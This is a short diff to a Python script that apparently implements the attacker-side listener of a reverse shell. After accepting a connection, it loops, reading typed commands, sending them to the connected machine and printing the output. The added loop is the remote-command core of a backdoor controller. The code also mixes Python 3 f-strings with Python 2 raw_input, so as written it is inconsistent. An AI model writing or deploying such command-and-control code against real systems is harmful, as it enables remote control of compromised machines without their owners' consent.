@@ -8,4 +8,10 @@ listener.listen(0)
 print("[+] Waiting for incoming connections.")
 
 connection, address = listener.accept()
-print("[+] Got a connection from {address}.")
+print(f"[+] Got a connection from {address}.")
+
+while True:
+    command = raw_input(">> ")
+    connection.send(command)
+    result = connection.recv(1024)
+    print(result)
